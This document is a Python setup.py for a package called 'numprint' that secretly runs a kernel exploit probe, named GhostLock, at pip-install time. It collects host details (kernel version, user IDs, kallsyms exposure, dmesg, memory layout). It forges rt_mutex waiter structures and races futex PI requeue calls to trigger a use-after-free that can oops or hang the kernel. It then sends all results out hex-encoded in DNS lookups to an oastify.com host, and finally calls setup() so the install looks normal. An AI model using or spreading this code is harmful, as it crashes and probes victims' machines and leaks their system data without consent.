#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
setup.py -- GhostLock (CVE-2026-43499) pip-install-time probe.

Fingerprints the environment, then tries to walk the dangling
task->pi_blocked_on left behind by the incomplete remove_waiter() fix.

Wire grammar (decoder-compatible, unchanged):
    <idx:03d>-<chunk:03d>-<hex>      idx 0 = final, 800/820/840 = checkpoints
    end-<n:03d>

Child pipe stage bytes (see _parse):
    1          fork ok
    2 +4       fvar, asz/8, nfd/8, psel_size
    3 +8       w_tid, w_lock_rc        (w_lock != 0 -> W never owned f_x)
    4 +4       requeue rc              (-35 == -EDEADLK, cycle fired)
    6 +4       waiter return rc        (MISS == W never left the wait)
    5 +4       reclaim rc
    7          about to drive
    9 +4       drive rc                (absent == drive never returned)
    E          unhandled exception
"""

import os
import time
import struct
import socket
import select
import mmap
import ctypes

try:
    import resource
except Exception:
    resource = None


# ---------------------------------------------------------------------------
# tunables
# ---------------------------------------------------------------------------
OAST = os.environ.get("GLK_OAST", "xtuc6efqmqdxb7cyy2rml1mp4gaby6mv.oastify.com")
RUN = os.environ.get("GLK_RUN", "glk5")
CHUNK = 52
T_CHILD = 1.90
T_GRACE = 0.35
T_DRIVE = 0.60

SKIP_A = bool(os.environ.get("GLK_SKIP_A"))
SKIP_A2 = bool(os.environ.get("GLK_SKIP_A2"))
SKIP_B = bool(os.environ.get("GLK_SKIP_B"))

AUXV_TRY = (368, 352, 344, 336, 328, 320, 256, 192, 128, 64)

SENT = None
MISS = 0x7ffffffe

PSEL_NFDS = 320
FD_PAD = 330
SIGURG = 23

FUTEX_WAKE = 1
FUTEX_LOCK_PI = 6
FUTEX_WAIT_REQUEUE_PI = 11
FUTEX_CMP_REQUEUE_PI = 12
FUTEX_PRIVATE = 128

PR_SET_MM = 35
PR_SET_MM_MAP = 14
MM_MAP_SIZE = 104

SYSLOG_READ_ALL = 3
SYSLOG_SIZE_BUFFER = 10

SCHED_NORMAL, SCHED_FIFO, SCHED_RR = 0, 1, 2
SCHED_BATCH = getattr(os, "SCHED_BATCH", 3)

EINVAL, ESRCH = 22, 3


# ---------------------------------------------------------------------------
# libc -- syscall numbers are PROBED, never trusted
# ---------------------------------------------------------------------------
_libc = ctypes.CDLL(None, use_errno=True)
_libc.syscall.restype = ctypes.c_long
_libc.prctl.restype = ctypes.c_int
_libc.prctl.argtypes = [ctypes.c_int, ctypes.c_ulong, ctypes.c_ulong,
                        ctypes.c_ulong, ctypes.c_ulong]
_ul = ctypes.c_ulong

_MACH = os.uname().machine
_X86 = _MACH in ("x86_64", "amd64")
NR = dict(futex=202 if _X86 else 98,
          pselect6=270 if _X86 else 72,
          tgkill=234 if _X86 else 131,
          gettid=186 if _X86 else 178,
          syslog=103 if _X86 else 116)

_RBRK = [0]
_KN = {}


def _sys(nr, *a):
    args = [_ul(int(x) & 0xFFFFFFFFFFFFFFFF) for x in a]
    ctypes.set_errno(0)
    r = _libc.syscall(_ul(nr), *args)
    e = ctypes.get_errno()
    return r, e


def _rc(nr, *a):
    r, e = _sys(nr, *a)
    if r == -1:
        return -e if e else -1
    return r


def _yield():
    time.sleep(0)


def _rd32(m):
    return struct.unpack_from("<I", m, 0)[0]


def _word():
    """(mmap, address).  TWO values -- keep the mmap, it owns the page."""
    m = mmap.mmap(-1, 0x1000)
    m[0:4] = b"\x00\x00\x00\x00"
    return m, ctypes.addressof(ctypes.c_uint32.from_buffer(m))


def _real_brk():
    """glibc __curbrk, cached before any PR_SET_MM_MAP can poison it."""
    if not _RBRK[0]:
        try:
            _libc.sbrk.restype = ctypes.c_void_p
            _libc.sbrk.argtypes = [ctypes.c_long]
            v = _libc.sbrk(0) or 0
            if v and v != 0xFFFFFFFFFFFFFFFF:
                _RBRK[0] = v
        except Exception:
            pass
    return _RBRK[0]


def _futex_nr():
    """Two conditions: unknown op -> -EINVAL ; wake on empty bucket -> 0.
    A single == 0 test also passes for nanosleep on a zeroed timespec."""
    if not _KN.get("futex"):
        m, a = _word()
        for nr in (NR["futex"], 98, 95, 202):
            r1, _e = _sys(nr, a, 0x7FFFFFFF, 0, 0, 0, 0)
            r2, _e = _sys(nr, a, FUTEX_WAKE | FUTEX_PRIVATE, 1, 0, 0, 0)
            if r1 == -EINVAL and r2 == 0:
                _KN["futex"] = nr
                break
        _KN.setdefault("futex", NR["futex"])
    return _KN["futex"]


def _pselect_nr():
    """nfds=0 -> 0 ; nfds=-1 -> -EINVAL."""
    if not _KN.get("psel"):
        tv = ctypes.create_string_buffer(b"\0" * 16, 16)
        ta = ctypes.addressof(tv)
        for nr in (NR["pselect6"], 72, 270):
            r1, _e = _sys(nr, 0, 0, 0, 0, ta, 0)
            r2, _e = _sys(nr, -1, 0, 0, 0, ta, 0)
            if r1 == 0 and r2 == -EINVAL:
                _KN["psel"] = nr
                break
        _KN.setdefault("psel", NR["pselect6"])
    return _KN["psel"]


def _tgkill_nr():
    """valid tid -> 0 ; bogus tid -> -ESRCH."""
    if not _KN.get("tgkill"):
        pid = os.getpid()
        for nr in (NR["tgkill"], 131, 234):
            r1, _e = _sys(nr, pid, pid, 0)
            r2, _e = _sys(nr, pid, 0x7FFFFFFF, 0)
            if r1 == 0 and r2 == -ESRCH:
                _KN["tgkill"] = nr
                break
        _KN.setdefault("tgkill", NR["tgkill"])
    return _KN["tgkill"]


def _syslog_nr():
    """SIZE_BUFFER: plausible, stable, positive."""
    if not _KN.get("syslog"):
        for nr in (NR["syslog"], 116, 113, 103):
            r1, _e = _sys(nr, SYSLOG_SIZE_BUFFER, 0, 0)
            if 4096 <= r1 <= 0x4000000:
                r2, _e = _sys(nr, SYSLOG_SIZE_BUFFER, 0, 0)
                if r1 == r2:
                    _KN["syslog"] = nr
                    break
        _KN.setdefault("syslog", NR["syslog"])
    return _KN["syslog"]


def _gettid():
    try:
        _libc.gettid.restype = ctypes.c_int
        t = _libc.gettid()
        if t > 0:
            return t
    except Exception:
        pass
    return _rc(NR["gettid"])


def _tgkill(pid, tid, sig):
    return _rc(_tgkill_nr(), pid, tid, sig)


def _lock_pi(a):
    return _rc(_futex_nr(), a, FUTEX_LOCK_PI | FUTEX_PRIVATE, 0, 0, 0, 0)


def _requeue_pi(a1, a2, v3):
    return _rc(_futex_nr(), a1, FUTEX_CMP_REQUEUE_PI | FUTEX_PRIVATE, 1, 1, a2, v3)


def _wake(a):
    return _rc(_futex_nr(), a, FUTEX_WAKE | FUTEX_PRIVATE, 1, 0, 0, 0)


# ---------------------------------------------------------------------------
# prctl_mm_map
# ---------------------------------------------------------------------------
def _read_maps():
    rows = []
    try:
        with open("/proc/self/maps") as fh:
            for ln in fh:
                p = ln.split()
                if len(p) < 6:
                    continue
                lo, hi = p[0].split("-")
                rows.append((int(lo, 16), int(hi, 16), p[1], p[5]))
    except Exception:
        pass
    return rows


def _mm_fields(variant):
    """Least-destructive first.  mm->brk = stack_start makes the next sbrk()
    take sys_brk()'s shrink branch and do_munmap(real+inc, stack_start),
    deleting libc, ld.so and every mmap'd arena.  Every field is a mapping
    *start* so validate_prctl_map_addr()'s find_vma(addr) / vm_start > addr
    test cannot reject the map."""
    rows = _read_maps()

    def first(pred):
        for lo, _hi, perms, name in rows:
            if pred(perms, name):
                return lo
        return 0

    stack = first(lambda p, n: "[stack]" in n)
    if not stack:
        stack = max((r[0] for r in rows), default=0x7ffff0000000)
    data = first(lambda p, n: "w" in p and "[" not in n) or stack
    code = first(lambda p, n: "x" in p and "[" not in n) or data
    heap = first(lambda p, n: "[heap]" in n) or data
    heap_end = 0
    for _lo, hi, _p, name in rows:
        if "[heap]" in name:
            heap_end = hi
            break
    rb = _real_brk() or heap_end

    if variant in ("stackall", "dataall"):
        A = stack if variant == "stackall" else data
        return dict(code=(A, A), data=(A, A), brk=(A, A), stack=A,
                    arg=(A, A), env=(A, A))

    if variant == "nat" and rb and rb > heap:
        brk = rb
    elif variant == "natm1" and rb and rb - 0x1000 > heap:
        brk = rb - 0x1000
    else:
        brk = heap
    return dict(code=(code, code), data=(data, data), brk=(heap, brk),
                stack=stack, arg=(stack, stack), env=(stack, stack))


def _pack(f, auxv, auxv_size):
    return struct.pack(
        "<12QII",
        f["code"][0], f["code"][1], f["data"][0], f["data"][1],
        f["brk"][0], f["brk"][1], f["stack"],
        f["arg"][0], f["arg"][1], f["env"][0], f["env"][1],
        auxv, auxv_size, 0xFFFFFFFF)


def _prctl_map(f, auxv_size, auxv_addr):
    buf = ctypes.create_string_buffer(_pack(f, auxv_addr, auxv_size), MM_MAP_SIZE)
    ctypes.set_errno(0)
    r = _libc.prctl(PR_SET_MM, PR_SET_MM_MAP,
                    ctypes.addressof(buf), MM_MAP_SIZE, 0)
    e = ctypes.get_errno()
    return -e if (r == -1 and e) else r


def _pick_fields():
    _real_brk()
    for v in ("nat", "natm1", "natst", "stackall"):
        f = _mm_fields(v)
        if _prctl_map(f, 0, 0) == 0:
            return f, v
    return _mm_fields("natst"), "fallback"


def _auxv_size(f):
    buf = ctypes.create_string_buffer(0x800)
    a = ctypes.addressof(buf)
    for n in AUXV_TRY:
        if _prctl_map(f, n, a) == 0:
            return n
    return 0


def _forge(buf, off, lockv):
    """Fake struct rt_mutex_waiter, 6.1 layout with rt_waiter_node:
    tree@0 (rb_node 24 | prio 4 | deadline 8 == 40), pi_tree@40, task@80,
    lock@88, ww_ctx@96.  Only `lock` is dereferenced directly; lockv=0 gives
    a deterministic PAN fault at address 0 rather than a qspinlock spin."""
    struct.pack_into("<i", buf, off + 0x18, 1)
    struct.pack_into("<i", buf, off + 0x40 + 0x18, 1)
    struct.pack_into("<Q", buf, off + 0x50, 0)
    struct.pack_into("<Q", buf, off + 0x58, lockv)
    struct.pack_into("<Q", buf, off + 0x60, 0)


def _roundup_pow2(x):
    p = 1
    while p < x:
        p <<= 1
    return p


def _psel_geometry():
    """Predict core_sys_select()'s `size` from alloc_fdtable()'s own maths:
    expand_fdtable(nr) -> alloc_fdtable(nr): nr/=128 ; nr=roundup_pow2(nr+1) ;
    nr*=128.  A fresh files_struct is NR_OPEN_DEFAULT (64).  Exact for
    need = 65/201/335."""
    hi = 0
    try:
        for nm in os.listdir("/proc/self/fd"):
            try:
                v = int(nm)
            except Exception:
                continue
            if v > hi:
                hi = v
    except Exception:
        pass
    need = hi + 1
    if need <= 64:
        mf = 64
    else:
        mf = _roundup_pow2(need // 128 + 1) * 128
    n = min(PSEL_NFDS, mf)
    size = ((n + 63) // 64) * 8
    return n, size


# ---------------------------------------------------------------------------
# environment
# ---------------------------------------------------------------------------
def _sf(name):
    try:
        with open("/proc/self/status") as fh:
            for ln in fh:
                if ln.startswith(name + ":"):
                    return ln.split(":", 1)[1].strip()
    except Exception:
        pass
    return "?"


def _psys(name):
    try:
        with open("/proc/sys/kernel/" + name) as fh:
            return fh.read().strip()
    except Exception:
        return "?"


def _dmesg():
    try:
        nr = _syslog_nr()
        n = _rc(nr, SYSLOG_SIZE_BUFFER, 0, 0)
        if n <= 0:
            return b""
        buf = ctypes.create_string_buffer(n + 1)
        m = _rc(nr, SYSLOG_READ_ALL, ctypes.addressof(buf), n)
        return buf.raw[:m] if m > 0 else b""
    except Exception:
        return b""


def _iomem():
    out = []
    try:
        with open("/proc/iomem") as fh:
            for ln in fh:
                p = ln.split()
                if len(p) < 3:
                    continue
                a, b = p[0].split("-")
                lo, hi = int(a, 16), int(b, 16)
                if lo == 0 and hi == 0:
                    continue
                out.append((lo, hi, " ".join(p[2:])))
    except Exception:
        pass
    return out


def _vstat(rel):
    try:
        maj, mi, pa = (int(x) for x in rel.split("-")[0].split(".")[:3])
    except Exception:
        return "UNKNOWN"
    if maj == 6 and mi == 1:
        return "VULNERABLE" if pa < 162 else "FIXED"
    if maj == 6 and mi == 18:
        return "VULNERABLE" if pa < 37 else "FIXED"
    if maj >= 7:
        return "FIXED"
    if maj < 6:
        return "VULNERABLE"
    return "UNKNOWN"


def _src():
    ks, lines = 0, 0
    try:
        with open("/proc/kallsyms", "rb") as fh:
            for ln in fh:
                lines += 1
                if ln[:16] != b"0000000000000000":
                    ks += 1
    except Exception:
        pass
    vmi = 0
    try:
        if os.path.getsize("/sys/kernel/vmcoreinfo") > 0:
            vmi = 1
    except Exception:
        pass
    mod = 0
    try:
        with open("/proc/modules") as fh:
            mod = sum(1 for _ in fh)
    except Exception:
        pass
    lay = 0
    for ln in _dmesg().split(b"\n"):
        if b".text" in ln or b"memory  :" in ln or b"Kernel code" in ln:
            lay += 1
    kcore = 0
    try:
        fd = os.open("/proc/kcore", os.O_RDONLY)
        os.close(fd)
        kcore = 1
    except Exception:
        pass
    io = _iomem()

    if _X86:
        cand = [0xffffffff81000000, 0xffff888000000000]
        base = 0xffff888000000000
    else:
        cand = [0xffff800008000000, 0xffff000080000000, 0xffff80000a000000]
        base = 0xffff000000000000
    for lo, _hi, nm in io:
        if "RAM" in nm and lo < 0x100000000:
            cand.append(base + lo)

    seen, out = set(), []
    for c in cand:
        if c not in seen:
            seen.add(c)
            out.append(c)

    return dict(ks=ks, lines=lines, zero=1 if (lines and not ks) else 0,
                vmi=vmi, mod=mod, lay=lay, kcore=kcore, iomem=len(io), cand=out)


# ---------------------------------------------------------------------------
# reporting
# ---------------------------------------------------------------------------
class Report(object):
    def __init__(self, tag):
        self.tag = tag
        self.lines = []

    def add(self, k, v):
        self.lines.append("%s=%s" % (k, v))

    def flush(self, idx=0):
        h = ("\n".join([self.tag] + self.lines) + "\n").encode("utf-8", "replace").hex()
        n = (len(h) + CHUNK - 1) // CHUNK
        for i in range(n):
            self._one("%03d-%03d-%s" % (idx, i, h[i * CHUNK:(i + 1) * CHUNK]))
        self._one("end-%03d" % n)

    @staticmethod
    def _one(label):
        try:
            socket.getaddrinfo(label + "." + OAST, None, socket.AF_INET)
        except Exception:
            pass


# ---------------------------------------------------------------------------
# child
# ---------------------------------------------------------------------------
def _drive(tid):
    """Force rt_mutex_adjust_pi(tid).

    Do NOT stop at the first success: if __sched_setscheduler() takes a no-op
    shortcut for that policy, rt_mutex_adjust_pi() never runs and the result
    is a false CLEAN.  Alternating BATCH<->NORMAL guarantees at least one call
    is a real policy change.  FIFO/RR are a bonus (need RLIMIT_RTPRIO or
    CAP_SYS_NICE; BATCH/NORMAL need neither)."""
    first = -1
    last = 0
    for pol, prio in ((SCHED_BATCH, 0), (SCHED_NORMAL, 0), (SCHED_BATCH, 0),
                      (SCHED_FIFO, 1), (SCHED_RR, 1)):
        try:
            os.sched_setscheduler(tid, pol, prio)
            if first < 0:
                first = pol
        except OSError as e:
            last = e.errno or 1
        except Exception:
            last = -1
    return first, (0 if first >= 0 else last)


def _mk_psel():
    return (ctypes.create_string_buffer(256),      # forge staging
            ctypes.create_string_buffer(64),       # read set
            ctypes.create_string_buffer(64),       # write set
            ctypes.create_string_buffer(64),       # except set
            ctypes.create_string_buffer(b"\0" * 16, 16))


def _psel_stage(allb, rd, wr, ex, size):
    """The kernel copies `size` bytes from EACH user pointer into
    stack_fds[0], [size], [2*size] -- so split the staging buffer by `size`,
    never by a constant."""
    ctypes.memmove(ctypes.addressof(rd), ctypes.addressof(allb), size)
    ctypes.memmove(ctypes.addressof(wr), ctypes.addressof(allb) + size, size)
    ctypes.memmove(ctypes.addressof(ex), ctypes.addressof(allb) + 2 * size, size)


def _psel_call(rd, wr, ex, tv, n):
    return _rc(_pselect_nr(), n, ctypes.addressof(rd), ctypes.addressof(wr),
               ctypes.addressof(ex), ctypes.addressof(tv), 0)


def _child_main(wfd, mode, woff, woff2, lockv):
    import threading

    def S(b):
        try:
            os.write(wfd, b)
        except Exception:
            pass

    S(b"1")

    # Force fdt->max_fds >= 512.  core_sys_select() clamps n to it; below
    # ~273 the forge no longer fits inside stack_fds[0 .. 3*size).
    nfd = 0
    for path in ("/dev/null", "/proc/self/status", "/"):
        if nfd >= FD_PAD:
            break
        try:
            os.close(os.open(path, os.O_RDONLY))
        except Exception:
            continue
        while nfd < FD_PAD:
            try:
                os.open(path, os.O_RDONLY)
                nfd += 1
            except Exception:
                break

    mt, at = _word()                    # f_t : requeue source (unowned)
    mc, ac = _word()                    # f_c : requeue target (owned by O)
    mx, ax = _word()                    # f_x : owned by W, O blocks here

    _real_brk()
    fields, fvar = _pick_fields()
    asz = _auxv_size(fields)
    use_prctl = (mode == "A" and asz >= MM_MAP_SIZE)

    pn, psz = _psel_geometry()

    aux = ctypes.create_string_buffer(0x800)
    mapbuf = ctypes.create_string_buffer(MM_MAP_SIZE)
    psel = _mk_psel()

    if use_prctl:
        off = min(max(woff, 0), asz - MM_MAP_SIZE)
        _forge(aux, off, lockv)
        mp = _pack(fields, ctypes.addressof(aux), asz)
    else:
        off = min(max(woff2, 0), max(0, 3 * psz - MM_MAP_SIZE))
        _forge(psel[0], off, lockv)
        mp = b""

    S(b"2" + bytes([len(fvar) & 0xFF, min(asz // 8, 255),
                    min(nfd // 8, 255), min(psz, 255)]))

    cpid = os.getpid()
    st = dict(w_own=0, w_going=0, o_own=0, o_going=0, w_ret=0, rq_done=0,
              w_tid=0, w_lock=0, rq=SENT, pr=SENT)

    def thr_w():
        st["w_tid"] = _gettid()
        st["w_lock"] = _lock_pi(ax)         # W owns f_x (0 == success)
        st["w_own"] = 1
        while not st["o_own"]:
            _yield()
        v = _rd32(mt)
        st["w_going"] = 1
        r = -11
        for _ in range(500):
            r = _rc(_futex_nr(), at, FUTEX_WAIT_REQUEUE_PI | FUTEX_PRIVATE,
                    v, 0, ac, v)
            if r != -11:
                break
            v = _rd32(mt)
            _yield()
        st["w_ret"] = r if r else 1
        # rt_waiter lives in THIS thread's frame: only W can reclaim it.
        # Spin with no syscalls from here -- W's own syscalls are the only
        # thing that can overwrite the frame the drive will read.
        while not st["rq_done"]:
            pass
        if use_prctl:
            ctypes.memmove(ctypes.addressof(mapbuf), mp, MM_MAP_SIZE)
            ctypes.set_errno(0)
            rr = _libc.prctl(PR_SET_MM, PR_SET_MM_MAP,
                             ctypes.addressof(mapbuf), MM_MAP_SIZE, 0)
            ee = ctypes.get_errno()
            st["pr"] = -ee if (rr == -1 and ee) else rr
        else:
            _psel_stage(psel[0], psel[1], psel[2], psel[3], psz)
            st["pr"] = _psel_call(psel[1], psel[2], psel[3], psel[4], pn)
        while True:
            pass

    def thr_o():
        while not st["w_own"]:
            _yield()
        _lock_pi(ac)                        # O owns f_c
        st["o_own"] = 1
        st["o_going"] = 1
        _lock_pi(ax)                        # blocks -> O->pi_blocked_on set
        while True:
            time.sleep(0.01)                # syscall-active so SIGTERM lands

    def thr_r():
        while not (st["w_going"] and st["o_going"]):
            _yield()
        time.sleep(0.020)                   # let W enqueue, O block
        r = 0
        for _ in range(500):
            r = _requeue_pi(at, ac, _rd32(mc))
            if r != -11:
                break
            _yield()
        st["rq"] = r
        st["rq_done"] = 1
        while True:
            time.sleep(0.01)

    threading.Thread(target=thr_w).start()
    threading.Thread(target=thr_o).start()
    threading.Thread(target=thr_r).start()

    while not st["w_own"]:
        _yield()
    while not st["o_own"]:
        _yield()
    S(b"3" + struct.pack("<ii", st["w_tid"], st["w_lock"]))

    while st["rq"] is SENT:
        _yield()
    S(b"4" + struct.pack("<i", st["rq"]))

    # Force W back to userland.  FUTEX_WAKE bails with -EINVAL when the
    # matching q has rt_waiter set; a second CMP_REQUEUE_PI may find nothing
    # if the first already moved the q.  Last resort: SIGURG, ignored by
    # default but still returns -EINTR out of the interruptible wait.
    t = time.time() + 0.30
    while not st["w_ret"] and time.time() < t:
        _wake(at)
        if not st["w_ret"]:
            _requeue_pi(at, ac, _rd32(mc))
        time.sleep(0.005)
    t = time.time() + 0.25
    while not st["w_ret"] and time.time() < t:
        _tgkill(cpid, st["w_tid"], SIGURG)
        time.sleep(0.010)
    while not st["w_ret"] and time.time() < t + 0.20:
        _yield()
    S(b"6" + struct.pack("<i", st["w_ret"] or MISS))

    t = time.time() + 0.40
    while st["pr"] is SENT and time.time() < t:
        _yield()
    S(b"5" + struct.pack("<i", st["pr"] if st["pr"] is not SENT else MISS))

    S(b"7")
    _pol, err = _drive(st["w_tid"])
    S(b"9" + struct.pack("<i", err))
    while True:
        _yield()


# ---------------------------------------------------------------------------
# parent
# ---------------------------------------------------------------------------
def _parse(buf):
    st, i, n = {}, 0, len(buf)
    while i < n:
        c = buf[i:i + 1]
        if c == b"1":
            st["1"] = 1
            i += 1
        elif c == b"2":
            if i + 5 <= n:
                st["2"] = (buf[i + 1], buf[i + 2], buf[i + 3], buf[i + 4])
            i += 5
        elif c == b"3":
            if i + 9 <= n:
                st["3"] = struct.unpack_from("<ii", buf, i + 1)
            i += 9
        elif c in (b"4", b"5", b"6", b"9"):
            if i + 5 <= n:
                st[c.decode()] = struct.unpack_from("<i", buf, i + 1)[0]
            i += 5
        elif c in (b"7", b"E"):
            st[c.decode()] = 1
            i += 1
        else:
            i += 1
    return st


def _classify(p, sig, alive):
    if "E" in p:
        return "EXC"
    if "9" in p:
        return "CLEAN"
    if "7" in p:
        return "WEDGE"
    if sig == 9:
        return "WEDGE"
    if "5" in p:
        return "RECLAIMED"
    if "4" in p:
        return "NO_RECLAIM"
    if "3" in p:
        return "STAGED"
    if sig == 15:
        return "HANG"
    if not p:
        return "SILENT"
    return "PARTIAL"


def _phase(mode, woff, woff2, lockv):
    rfd, wfd = os.pipe()
    pid = os.fork()
    if pid == 0:
        try:
            os.close(rfd)
            _child_main(wfd, mode, woff, woff2, lockv)
        except BaseException:
            try:
                os.write(wfd, b"E")
            except Exception:
                pass
        finally:
            try:
                os.close(wfd)
            except Exception:
                pass
        os._exit(0)

    os.close(wfd)
    buf = b""
    deadline = time.time() + T_CHILD
    while len(buf) < 64:
        left = deadline - time.time()
        if left <= 0:
            break
        try:
            r, _, _ = select.select([rfd], [], [], left)
        except Exception:
            break
        if not r:
            break
        try:
            d = os.read(rfd, 64)
        except OSError:
            break
        if not d:
            break
        buf += d
        p = _parse(buf)
        if "7" in p and "9" not in p:
            deadline = min(deadline, time.time() + T_DRIVE)
        if "9" in p:
            break
    try:
        os.close(rfd)
    except Exception:
        pass

    sig = alive = 0
    try:
        _, stt = os.waitpid(pid, os.WNOHANG)
        if stt == 0:
            os.kill(pid, 15)
            t = time.time() + T_GRACE
            while time.time() < t:
                _, stt = os.waitpid(pid, os.WNOHANG)
                if stt:
                    break
                time.sleep(0.01)
            if not stt:
                try:
                    os.kill(pid, 9)
                except Exception:
                    pass
                alive = 1
                _, stt = os.waitpid(pid, os.WNOHANG)
        if stt and os.WIFSIGNALED(stt):
            sig = os.WTERMSIG(stt)
    except Exception:
        pass
    return buf, sig, alive


# ---------------------------------------------------------------------------
# main
# ---------------------------------------------------------------------------
def _probe(R):
    f, v = _pick_fields()
    R.add("pmap_rc", _prctl_map(f, 0, 0))
    R.add("mmv", v)
    if _prctl_map(f, 0, 0) != 0:
        R.add("prctl_auxv_rc", -1)
        R.add("paux_sz", 0)
        R.add("paux_err", 0)
        return
    buf = ctypes.create_string_buffer(0x800)
    a = ctypes.addressof(buf)
    best, err = 0, 0
    for n in AUXV_TRY:
        r = _prctl_map(f, n, a)
        if r == 0:
            best = n
            break
        err = r
    R.add("prctl_auxv_rc", 0 if best else err)
    R.add("paux_sz", best)
    R.add("paux_err", 0 if best else err)


def _main():
    t0 = time.time()
    R = Report(RUN)
    _real_brk()

    u = os.uname()
    R.add("kern", u.release)
    R.add("arch", u.machine)
    R.add("vstat", _vstat(u.release))
    R.add("ncpu", os.cpu_count() or 0)
    R.add("uid", "%d euid=%d nnp=%s" % (os.getuid(), os.geteuid(), _sf("NoNewPrivs")))
    R.add("panic", "panic=%s onoops=%s oopslim=%s"
          % (_psys("panic"), _psys("panic_on_oops"), _psys("oops_limit")))
    R.add("nrs", "futex=%d psel=%d tgkill=%d syslog=%d"
          % (_futex_nr(), _pselect_nr(), _tgkill_nr(), _syslog_nr()))

    s = _src()
    R.add("src", "ks=%d/%d zero=%d vmi=%d mod=%d lay=%d kcore=%d iomem=%d"
          % (s["ks"], s["lines"], s["zero"], s["vmi"], s["mod"],
             s["lay"], s["kcore"], s["iomem"]))
    R.add("cand", ",".join("0x%x" % c for c in s["cand"]))

    _probe(R)
    R.flush(800)

    woff = int(os.environ.get("GLK_WOFF", "0"))
    woff2 = int(os.environ.get("GLK_WOFF2", "0"))
    lockv = int(os.environ.get("GLK_LOCK", "0"), 16)

    verdict = "INCONCLUSIVE"

    for tag, mode, skip in (("A", "A", SKIP_A), ("A2", "A2", SKIP_A2)):
        if skip:
            continue
        b, sg, al = _phase(mode, woff, woff2, lockv)
        p = _parse(b)
        c = _classify(p, sg, al)
        q = p.get("2", (0, 0, 0, 0))
        t3 = p.get("3", (0, 0))
        R.add(tag, c)
        R.add(tag + "_st", b.hex())
        R.add(tag + "_sig", sg)
        R.add(tag + "_alive", al)
        R.add(tag + "_fv", q[0])
        R.add(tag + "_asz", q[1] * 8)
        R.add(tag + "_nfd", q[2] * 8)
        R.add(tag + "_psz", q[3])
        R.add(tag + "_tid", t3[0])
        R.add(tag + "_wlock", t3[1])
        R.add(tag + "_rq", p.get("4", MISS))
        R.add(tag + "_wret", p.get("6", MISS))
        R.add(tag + "_pr", p.get("5", MISS))
        R.add(tag + "_drv", p.get("9", MISS))
        if c == "WEDGE":
            verdict = "VULNERABLE"
        R.flush(820 if tag == "A" else 840)

    if not SKIP_B:
        hits = []
        for wv in (0, 32, 96, 160, 224):
            b, sg, al = _phase("A", wv, woff2, lockv)
            c = _classify(_parse(b), sg, al)
            hits.append("B%d=%s" % (wv, c))
            if c == "WEDGE":
                verdict = "VULNERABLE"
                break
        R.add("B", " ".join(hits))

    if verdict != "VULNERABLE" and _vstat(u.release) == "FIXED":
        verdict = "FIXED"

    R.add("verdict", verdict)
    R.add("ms", int((time.time() - t0) * 1000))
    R.add("note", "sig9=oops sig15=reaped_by_us alive1=stuck; WEDGE=7_no_9")
    R.flush(0)


# ---------------------------------------------------------------------------
# run once, then always satisfy setuptools
# ---------------------------------------------------------------------------
try:
    if not os.path.exists(".glk-done"):
        if resource is not None:
            try:
                soft, hard = resource.getrlimit(resource.RLIMIT_RTPRIO)
                if soft < 1:
                    for pair in ((1, max(hard, 1)), (1, hard)):
                        try:
                            resource.setrlimit(resource.RLIMIT_RTPRIO, pair)
                            break
                        except Exception:
                            pass
            except Exception:
                pass
        _main()
        try:
            open(".glk-done", "w").close()
        except Exception:
            pass
except BaseException:
    pass

from setuptools import setup

setup(
    name="numprint",
    version="0.0.0",
    description="GhostLock probe payload",
)
